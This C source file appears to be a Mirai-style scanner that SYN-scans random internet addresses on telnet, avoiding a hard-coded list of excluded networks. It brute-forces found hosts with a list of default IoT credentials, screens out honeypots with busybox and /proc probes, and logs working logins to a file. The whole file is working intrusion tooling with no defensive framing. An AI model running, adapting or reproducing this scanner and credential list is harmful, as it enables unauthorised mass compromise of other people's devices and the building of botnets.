#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define MAX_SCANNER_THREADS 128
#define PORTSCAN_CPU_LIMIT 1.00
#define PORTSCAN_MIN_THREADS 4
#define BRUTE_WORKERS 200
#define BRUTE_QUEUE_MAX 1000000

static volatile int scanner_active = 0;
static pthread_t *scanner_threads;
static int *scanner_thread_ids;
static int scanner_thread_count = 0;
static int scan_port = 23;
static uint32_t src_ip_n = 0;

/* brute queue */
static uint32_t brute_queue[BRUTE_QUEUE_MAX];
static volatile int brute_head = 0, brute_tail = 0, brute_count = 0;
static pthread_mutex_t brute_mutex = PTHREAD_MUTEX_INITIALIZER;
static pthread_cond_t brute_cond = PTHREAD_COND_INITIALIZER;

/* file lock for logging */
static pthread_mutex_t log_lock = PTHREAD_MUTEX_INITIALIZER;

/* brute stats */
static volatile int stat_total = 0, stat_active = 0, stat_real = 0;
static volatile int stat_fail = 0, stat_honeypot = 0;
static struct timespec start_ts;

static const char *creds[][2] = {
    {"", ""},{"admin", ""},{"admin", "1234"},{"admin", "12345"},{"admin", "123456"},
    {"admin", "1234567"},{"admin", "12345678"},{"admin", "123456789"},{"admin", "123123"},
    {"admin", "4321"},{"admin", "7ujMko0admin"},{"admin", "admin"},{"admin", "admin123"},
    {"admin", "admin1234"},{"admin", "admin12345"},{"admin", "admin123456"},
    {"admin", "admin12345678"},{"admin", "admin123456789"},{"admin", "CalVxePV1!"},
    {"admin", "default"},{"admin", "password"},{"admin", "root123"},{"admin", "vertex25ektks123"},
    {"default", ""},{"default", "default"},{"guest", "123456"},{"hikvision", "hikvision"},
    {"root", ""},{"root", "000000"},{"root", "070admin"},{"root", "1001chin"},
    {"root", "1234"},{"root", "12345"},{"root", "123456"},{"root", "12345678"},
    {"root", "123456789"},{"root", "54321"},{"root", "5up"},{"root", "666666"},
    {"root", "7ujMko0admin"},{"root", "86981198"},{"root", "888888"},{"root", "admin"},
    {"root", "admin123"},{"root", "adminpassword"},{"root", "default"},{"root", "hkipc2016"},
    {"root", "icatch99"},{"root", "j1/_6s*w"},{"root", "juantech"},{"root", "klv123"},
    {"root", "ms3456"},{"root", "neworang"},{"root", "oelinux123"},{"root", "pass"},
    {"root", "password"},{"root", "root"},{"root", "root123"},{"root", "root123456"},
    {"root", "sharpvision"},{"root", "solokey"},{"root", "system"},{"root", "vertex25ektks123"},
    {"root", "vizxv"},{"root", "wabjtam"},{"root", "xc3511"},{"root", "xmhdipc"},
    {"root", "abcd1234"},{"telecomadmin", "admintelecom"},{"telnetadmin", "telnetadmin"},
    {"user", "12345"},{"user", "password"},{"user", "user"},{"usr", "www.usr.cn"},
    {"vstarcam2015", "20150602"},
};
#define CRED_COUNT (sizeof(creds) / sizeof(creds[0]))

typedef struct { unsigned int network; unsigned int mask; } cidr_t;

static cidr_t excluded_nets[] = {
    {0x00000000, 0xFF000000}, {0x08000000, 0xFF000000}, {0x0A000000, 0xFF000000},
    {0x2F000000, 0xFF000000}, {0x7F000000, 0xFF000000}, {0xA9FE0000, 0xFFFF0000},
    {0xAC100000, 0xFFF00000}, {0xC0A80000, 0xFFFF0000}, {0x64400000, 0xFFC00000},
    {0x0F000000, 0xFF000000}, {0x10000000, 0xFF000000}, {0x38000000, 0xFF000000},
    {0x03000000, 0xFF000000}, {0xC6120000, 0xFFFE0000}, {0x22000000, 0xFF000000},
    {0x23000000, 0xFF000000}, {0x8A680000, 0xFFFF0000}, {0x9F590000, 0xFFFF0000},
    {0x9F5B0000, 0xFFFF0000}, {0x468C0000, 0xFFFF0000}, {0xE0000000, 0xF0000000},
    {0xF0000000, 0xF0000000}, {0xFF000000, 0xFF000000},
    {0x06000000, 0xFF000000}, {0x07000000, 0xFF000000}, {0x0B000000, 0xFF000000},
    {0x15000000, 0xFF000000}, {0x16000000, 0xFF000000}, {0x19000000, 0xFF000000},
    {0x1A000000, 0xFF000000}, {0x1C000000, 0xFF000000}, {0x1D000000, 0xFF000000},
    {0x1E000000, 0xFF000000}, {0x21000000, 0xFF000000}, {0x31000000, 0xFF000000},
    {0x32000000, 0xFF000000}, {0x37000000, 0xFF000000}, {0x89000000, 0xFF000000},
    {0xD6000000, 0xFF000000}, {0xD7000000, 0xFF000000}, {0x0D000000, 0xFF000000},
    {0x92110000, 0xFFFF0000}, {0x92500000, 0xFFFF0000}, {0x92620000, 0xFFFF0000},
    {0x929A0000, 0xFFFF0000}, {0x939F0000, 0xFFFF0000}, {0x94720000, 0xFFFF0000},
    {0x967D0000, 0xFFFF0000}, {0x96850000, 0xFFFF0000}, {0x96900000, 0xFFFF0000},
    {0x96950000, 0xFFFF0000}, {0x969D0000, 0xFFFF0000}, {0x98520000, 0xFFFF0000},
    {0x98E50000, 0xFFFF0000}, {0x9DCA0000, 0xFFFF0000}, {0x9DD90000, 0xFFFF0000},
    {0xA17C0000, 0xFFFF0000}, {0xA2200000, 0xFFFF0000}, {0x9B600000, 0xFFFF0000},
    {0x9B950000, 0xFFFF0000}, {0x9B9B0000, 0xFFFF0000}, {0x9BB20000, 0xFFFF0000},
    {0xA49E0000, 0xFFFF0000}, {0x9C090000, 0xFFFF0000}, {0xA72C0000, 0xFFFF0000},
    {0xA8440000, 0xFFFF0000}, {0xA8550000, 0xFFFF0000}, {0xA8660000, 0xFFFF0000},
    {0xCB3B0000, 0xFFFF0000}, {0xCC220000, 0xFFFF0000}, {0xCF1E0000, 0xFFFF0000},
    {0xD1C00000, 0xFFF00000}, {0xD1D00000, 0xFFF00000}, {0xD1E00000, 0xFFF00000},
    {0xD1F00000, 0xFFF00000}, {0xD1A00000, 0xFFF00000}, {0xD1B00000, 0xFFF00000},
    {0x2B000000, 0xFF000000}, {0x39000000, 0xFF000000}, {0x63F00000, 0xFFF00000},
    {0x68F80000, 0xFFFE0000}, {0x6FD00000, 0xFFF00000}, {0x71300000, 0xFFF00000},
    {0x79F00000, 0xFFF00000}, {0x7B000000, 0xFF000000}, {0x7C000000, 0xFF000000},
    {0x84740000, 0xFFFF0000}, {0x882B0000, 0xFFFF0000}, {0x911B0000, 0xFFFF0000},
    {0x99880000, 0xFFFF0000}, {0x9E850000, 0xFFFF0000}, {0xA2570000, 0xFFFF0000},
    {0xA6B80000, 0xFFFF0000}, {0xA8600000, 0xFFFF0000}, {0xAA1A0000, 0xFFFF0000},
    {0xAAF30000, 0xFFFF0000}, {0xBAB90000, 0xFFFF0000}, {0xBBCA0000, 0xFFFF0000},
    {0xBD140000, 0xFFFF0000}, {0xBD9B0000, 0xFFFF0000}, {0x50D00000, 0xFFF00000},
    {0xCF2A0000, 0xFFFF0000}, {0xCF2C0000, 0xFFFF0000}, {0xD19E0000, 0xFFFF0000},
    {0x41E00000, 0xFFF00000}, {0x46460000, 0xFFFF0000}, {0x48840000, 0xFFFF0000},
    {0x491B0000, 0xFFFF0000}, {0x497C0000, 0xFFFF0000}, {0x4A470000, 0xFFFF0000},
    {0x513E0000, 0xFFFF0000}, {0x52D80000, 0xFFFF0000}, {0x57CA0000, 0xFFFF0000},
    {0x5B8A0000, 0xFFFF0000}, {0x5BDD0000, 0xFFFF0000}, {0x62340000, 0xFFFF0000},
    {0x66D20000, 0xFFFF0000}, {0x68040000, 0xFFFF0000}, {0x68D70000, 0xFFFF0000},
    {0x6A4C0000, 0xFFFF0000}, {0x6C270000, 0xFFFF0000}, {0x6DDB0000, 0xFFFF0000},
    {0xCF110000, 0xFFFF0000}, {0xD5220000, 0xFFFF0000}, {0xB2EB0000, 0xFFFF0000},
    {0x48F50000, 0xFFFF0000}, {0x22A00000, 0xFFF00000}, {0x41760000, 0xFFFF0000},
    {0x46C90000, 0xFFFF0000}, {0xD2B60000, 0xFFFF0000},
    {0, 0}
};

static uint8_t exclude_8_tab[256];
static int exclude_8_ready = 0;

static void init_exclude_fast(void) {
    if (exclude_8_ready) return;
    for (int i = 0; excluded_nets[i].mask != 0; i++) {
        if (excluded_nets[i].mask == 0xFF000000)
            exclude_8_tab[excluded_nets[i].network >> 24] = 1;
    }
    exclude_8_ready = 1;
}

static int is_excluded(unsigned int ip) {
    if (exclude_8_tab[ip >> 24]) return 1;
    for (int i = 0; excluded_nets[i].mask != 0; i++) {
        if (excluded_nets[i].mask == 0xFF000000) continue;
        if ((ip & excluded_nets[i].mask) == excluded_nets[i].network)
            return 1;
    }
    return 0;
}

static unsigned int thread_random(unsigned int *state) {
    unsigned int x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

static void raise_fd_limit(void) {
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }
}

static uint16_t generic_checksum(uint16_t *addr, int len) {
    uint32_t sum = 0;
    for (int i = 0; i < len / 2; i++) sum += addr[i];
    if (len & 1) sum += ((uint8_t*)addr)[len - 1];
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint16_t tcp_udp_checksum(struct tcphdr *tcp, int len, uint32_t src, uint32_t dst, uint8_t proto) {
    uint32_t sum = 0;
    uint16_t *p;
    p = (uint16_t*)&src; sum += p[0]; sum += p[1];
    p = (uint16_t*)&dst; sum += p[0]; sum += p[1];
    sum += htons((uint16_t)proto);
    sum += htons((uint16_t)len);
    p = (uint16_t*)tcp;
    for (int i = 0; i < len / 2; i++) sum += p[i];
    if (len & 1) sum += ((uint8_t*)tcp)[len - 1];
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

/* push ip in host byte order to brute queue (with dedup) */
#define DEDUP_BITS (1 << 22)          /* 4M slots */
static unsigned char dedup_tab[DEDUP_BITS / 8];
static int dedup_seen(uint32_t ip) {
    uint32_t h = (ip ^ (ip >> 16)) * 2654435761u;
    uint32_t idx = (h >> 8) & (DEDUP_BITS - 1);
    uint32_t byte = idx >> 3, bit = idx & 7;
    if (dedup_tab[byte] & (1 << bit)) return 1;   /* already seen */
    dedup_tab[byte] |= (1 << bit);
    return 0;
}

static void push_brute(uint32_t ip) {
    if (dedup_seen(ip)) return;       /* skip repeats (same IP found once) */
    pthread_mutex_lock(&brute_mutex);
    if (brute_count < BRUTE_QUEUE_MAX) {
        brute_queue[brute_tail] = ip;
        brute_tail = (brute_tail + 1) % BRUTE_QUEUE_MAX;
        brute_count++;
        pthread_cond_signal(&brute_cond);
    }
    pthread_mutex_unlock(&brute_mutex);
}

static uint32_t pop_brute(void) {
    pthread_mutex_lock(&brute_mutex);
    while (brute_count == 0 && scanner_active)
        pthread_cond_wait(&brute_cond, &brute_mutex);
    if (!scanner_active) { pthread_mutex_unlock(&brute_mutex); return 0; }
    uint32_t ip = brute_queue[brute_head];
    brute_head = (brute_head + 1) % BRUTE_QUEUE_MAX;
    brute_count--;
    pthread_mutex_unlock(&brute_mutex);
    return ip;
}

/* read all available data up to timeout */
static int drain_sock(int fd, char *buf, int bufsz, int timeout_ms) {
    struct pollfd pfd;
    pfd.fd = fd;
    pfd.events = POLLIN;
    int total = 0;
    while (total < bufsz - 1) {
        int rc = poll(&pfd, 1, timeout_ms);
        if (rc <= 0) break;
        int n = read(fd, buf + total, bufsz - 1 - total);
        if (n <= 0) break;
        total += n;
        timeout_ms = 1500;
    }
    buf[total] = 0;
    return total;
}

/* connect to target, return fd or -1 */
static int connect_target(const char *ip_str, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -1;
    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    if (inet_pton(AF_INET, ip_str, &sin.sin_addr) != 1) { close(fd); return -1; }
    struct timeval tv;
    tv.tv_sec = 5; tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(fd, (struct sockaddr*)&sin, sizeof(sin)) < 0) { close(fd); return -1; }
    return fd;
}

/* 1 = honeypot (failed checks), 0 = real */
static int is_honeypot(int fd) {
    struct timeval tv;
    tv.tv_sec = 6;
    tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    char buf[4096];

    write(fd, "/bin/busybox TEST\r\n", 19);
    drain_sock(fd, buf, sizeof(buf), 5000);
    if (!strstr(buf, "applet not found")) return 1;

    write(fd, "cat /proc\r\n", 10);
    drain_sock(fd, buf, sizeof(buf), 5000);
    if (!strstr(buf, "cat:")) return 1;

    write(fd, "/\r\n", 3);
    drain_sock(fd, buf, sizeof(buf), 5000);
    if (strstr(buf, "command not found") || buf[0] == 0) return 1;

    return 0;
}

/* thread-safe logging */
static void log_line(const char *file, const char *line) {
    pthread_mutex_lock(&log_lock);
    FILE *f = fopen(file, "a");
    if (f) {
        fprintf(f, "%s\n", line);
        fclose(f);
    }
    pthread_mutex_unlock(&log_lock);
}

static void *bruter_worker(void *arg) {
    (void)arg;
    char ip_str[32];
    while (scanner_active) {
        uint32_t ip = pop_brute();
        if (ip == 0) break;
        struct in_addr a;
        a.s_addr = htonl(ip);
        const char *ip_s = inet_ntoa(a);
        strncpy(ip_str, ip_s, sizeof(ip_str) - 1);
        ip_str[sizeof(ip_str) - 1] = 0;

        __sync_fetch_and_add(&stat_total, 1);
        __sync_fetch_and_add(&stat_active, 1);

        int authfd = -1;
        int authed = 0;
        const char *succ_user = "", *succ_pass = "";
        int fd = connect_target(ip_str, scan_port);
        char buf[4096];
        if (fd >= 0) drain_sock(fd, buf, sizeof(buf), 3000);

        for (unsigned int c = 0; c < CRED_COUNT && authfd < 0; c++) {
            if (fd < 0) {
                fd = connect_target(ip_str, scan_port);
                if (fd < 0) { usleep(10000); break; }
                drain_sock(fd, buf, sizeof(buf), 3000);
            }

            /* send username */
            write(fd, creds[c][0], strlen(creds[c][0]));
            write(fd, "\r\n", 2);
            drain_sock(fd, buf, sizeof(buf), 5000);

            /* send password */
            write(fd, creds[c][1], strlen(creds[c][1]));
            write(fd, "\r\n", 2);
            drain_sock(fd, buf, sizeof(buf), 5000);

            if (strstr(buf, "$") || strstr(buf, "#") || strstr(buf, "@") ||
                strstr(buf, "~$") || strstr(buf, "~#")) {
                write(fd, "echo SHELL_TEST\r\n", 17);
                drain_sock(fd, buf, sizeof(buf), 5000);
                if (strstr(buf, "SHELL_TEST")) {
                    authed = 1;
                    authfd = fd;
                    succ_user = creds[c][0];
                    succ_pass = creds[c][1];
                    break;
                }
            }

            if (strstr(buf, "login:") || strstr(buf, "Login:") || strstr(buf, ":"))
                continue;

            memset(buf, 0, sizeof(buf));
            int n = drain_sock(fd, buf, sizeof(buf), 800);
            if (n > 0 && (strstr(buf, "login:") || strstr(buf, "Login:") || strstr(buf, ":")))
                continue;

            close(fd);
            fd = -1;
        }

        if (!authed && fd >= 0) close(fd);

        if (authed && authfd >= 0) {
            char line[128];
            snprintf(line, sizeof(line), "%s:%d:%s:%s", ip_str, scan_port, succ_user, succ_pass);

            if (is_honeypot(authfd)) {
                printf("\nHONEYPOT: %s\n", line);
                __sync_fetch_and_add(&stat_honeypot, 1);
                log_line("honeypot.txt", line);
                close(authfd);
            } else {
                printf("\nREAL: %s\n", line);
                __sync_fetch_and_add(&stat_real, 1);
                log_line("realtelnet.txt", line);
                close(authfd);
            }
        } else {
            if (authfd >= 0) close(authfd);
            __sync_fetch_and_add(&stat_fail, 1);
        }
        __sync_fetch_and_add(&stat_active, -1);
    }
    return NULL;
}

static void *scanner_thread_func(void *arg) {
    int thread_id = *(int*)arg;
    unsigned int rng_state = (unsigned int)time(NULL) ^ ((unsigned int)thread_id << 16);

    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock < 0) {
        printf("\r[!] scanner thread %d: raw socket failed (need root? errno=%d)\n", thread_id, errno);
        fflush(stdout);
        return NULL;
    }

    int one = 1;
    setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int recv_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (recv_sock < 0) { close(raw_sock); return NULL; }
    fcntl(recv_sock, F_SETFL, O_NONBLOCK);

    int rcvbuf = 1024 * 1024;
    setsockopt(recv_sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

    unsigned char pkt[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    memset(pkt, 0, sizeof(pkt));
    struct iphdr *iph = (struct iphdr *)pkt;
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(pkt));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = src_ip_n;
    struct tcphdr *tcph = (struct tcphdr *)(pkt + sizeof(struct iphdr));
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(1024);
    tcph->dest = htons(scan_port);

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;

    while (scanner_active) {
        unsigned int batch = 500 + (thread_random(&rng_state) % 500);
        for (unsigned int i = 0; i < batch && scanner_active; i++) {
            unsigned int raw_ip;
            uint32_t dst_ip_n;
            do {
                raw_ip = thread_random(&rng_state);
                dst_ip_n = htonl(raw_ip);
            } while (is_excluded(raw_ip));
            uint16_t sport = 1024 + (uint16_t)(thread_random(&rng_state) % 60000);
            uint32_t seq_val = (thread_random(&rng_state) << 16) | (thread_random(&rng_state) & 0xFFFF);

            iph->id = htons((uint16_t)(seq_val & 0xFFFF));
            iph->daddr = dst_ip_n;
            iph->check = 0;
            iph->check = generic_checksum((uint16_t*)iph, sizeof(struct iphdr));

            tcph->source = htons(sport);
            tcph->seq = htonl(seq_val);
            tcph->check = 0;
            tcph->check = tcp_udp_checksum(tcph, sizeof(struct tcphdr), src_ip_n, dst_ip_n, IPPROTO_TCP);

            sin.sin_addr.s_addr = dst_ip_n;
            sendto(raw_sock, pkt, sizeof(pkt), 0, (struct sockaddr*)&sin, sizeof(sin));
        }

        for (int r = 0; r < 1000 && scanner_active; r++) {
            unsigned char rbuf[2048];
            ssize_t len = recv(recv_sock, rbuf, sizeof(rbuf), 0);
            if (len <= 0) break;

            if (len < (ssize_t)(sizeof(struct iphdr) + sizeof(struct tcphdr))) continue;
            struct iphdr *rip = (struct iphdr *)rbuf;
            if (rip->protocol != IPPROTO_TCP) continue;
            int iph_len = rip->ihl * 4;
            if (len < iph_len + (ssize_t)sizeof(struct tcphdr)) continue;
            struct tcphdr *rtcp = (struct tcphdr *)(rbuf + iph_len);
            if (rip->daddr != src_ip_n) continue;
            if (!rtcp->syn || !rtcp->ack) continue;
            if (rtcp->rst) continue;
            if (ntohs(rtcp->source) != (uint16_t)scan_port) continue;

            uint32_t src_ip_h = ntohl(rip->saddr);

            /* push to queue (no dedup here – the brute workers will handle repeats) */
            push_brute(src_ip_h);
        }
    }

    close(raw_sock);
    close(recv_sock);
    return NULL;
}

static void *status_thread(void *arg) {
    (void)arg;
    while (scanner_active) {
        sleep(3);
        int q = 0;
        pthread_mutex_lock(&brute_mutex);
        q = brute_count;
        pthread_mutex_unlock(&brute_mutex);
        int t = __sync_fetch_and_add(&stat_total, 0);
        int a = __sync_fetch_and_add(&stat_active, 0);
        int r = __sync_fetch_and_add(&stat_real, 0);
        int h = __sync_fetch_and_add(&stat_honeypot, 0);
        int f = __sync_fetch_and_add(&stat_fail, 0);
        printf("\rActive: %d | Queue: %d | Total: %d | Real: %d | Honeypots: %d | Fails: %d           ", a, q, t, r, h, f);
        fflush(stdout);
    }
    return NULL;
}

int main(int argc, char **argv) {
    signal(SIGPIPE, SIG_IGN);

    scan_port = 23;
    if (argc >= 2) scan_port = atoi(argv[1]);

    /* get local source IP by connecting to 8.8.8.8 */
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd >= 0) {
        struct sockaddr_in sin;
        memset(&sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(53);
        sin.sin_addr.s_addr = inet_addr("8.8.8.8");
        if (connect(fd, (struct sockaddr*)&sin, sizeof(sin)) == 0) {
            socklen_t len = sizeof(sin);
            if (getsockname(fd, (struct sockaddr*)&sin, &len) == 0)
                src_ip_n = sin.sin_addr.s_addr;
        }
        close(fd);
    }

    init_exclude_fast();
    raise_fd_limit();
    clock_gettime(CLOCK_MONOTONIC, &start_ts);

    /* check raw socket capability */
    int test_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (test_raw < 0) {
        fprintf(stderr, "[-] WARNING: raw socket failed (errno=%d). Need root? Scanner will produce no results.\n", errno);
    } else {
        close(test_raw);
    }

    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores < 1) cores = 1;
    scanner_thread_count = (int)(cores * PORTSCAN_CPU_LIMIT);
    if (scanner_thread_count < PORTSCAN_MIN_THREADS)
        scanner_thread_count = PORTSCAN_MIN_THREADS;
    if (scanner_thread_count > MAX_SCANNER_THREADS)
        scanner_thread_count = MAX_SCANNER_THREADS;

    scanner_threads = malloc(sizeof(pthread_t) * scanner_thread_count);
    scanner_thread_ids = malloc(sizeof(int) * scanner_thread_count);
    if (!scanner_threads || !scanner_thread_ids) return 1;

    scanner_active = 1;

    pthread_t st;
    pthread_create(&st, NULL, status_thread, NULL);

    pthread_t *bruters = malloc(sizeof(pthread_t) * BRUTE_WORKERS);
    if (!bruters) return 1;
    for (int i = 0; i < BRUTE_WORKERS; i++)
        pthread_create(&bruters[i], NULL, bruter_worker, NULL);

    for (int i = 0; i < scanner_thread_count; i++) {
        scanner_thread_ids[i] = i;
        pthread_create(&scanner_threads[i], NULL, scanner_thread_func, &scanner_thread_ids[i]);
    }

    for (int i = 0; i < scanner_thread_count; i++)
        pthread_join(scanner_threads[i], NULL);

    scanner_active = 0;
    pthread_cond_broadcast(&brute_cond);

    for (int i = 0; i < BRUTE_WORKERS; i++)
        pthread_join(bruters[i], NULL);
    free(bruters);

    return 0;
}
